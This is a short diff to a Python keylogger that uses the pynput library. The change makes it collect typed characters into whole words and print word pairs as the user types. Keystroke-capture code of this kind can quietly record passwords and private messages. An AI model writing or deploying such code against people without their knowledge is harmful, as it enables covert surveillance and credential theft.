@@ -3,6 +3,8 @@ from pynput import keyboard
 from datetime import datetime
 
 keylog = []
+words = []
+current_word = ''
 prev_word = ''
 line_position = 0
 
@@ -16,20 +18,25 @@ def log():
             line_position = 0
 
 def on_press(key):
+    global current_word
     global prev_word
+    global words
     try:
         # print(str(key.char))
         keylog.append(str(key.char))
 
         if str(key.char).isalpha():
-            prev_word += str(key.char)
+            current_word += str(key.char)
     except AttributeError:
         if(str(key)[4:] == 'space'):
             keylog.append(' ')
             # print(' ')
 
-            print('Previous word: ' + prev_word)
-            prev_word = ''
+            words.append(current_word)
+            print('Current word: ' + current_word)
+            print('Word pair: ' + prev_word + ' ' + current_word)
+            prev_word = current_word
+            current_word = ''
         else:
             keylog.append('<' + str(key)[4:] + '>')
             # print('<' + str(key)[4:] + '>')
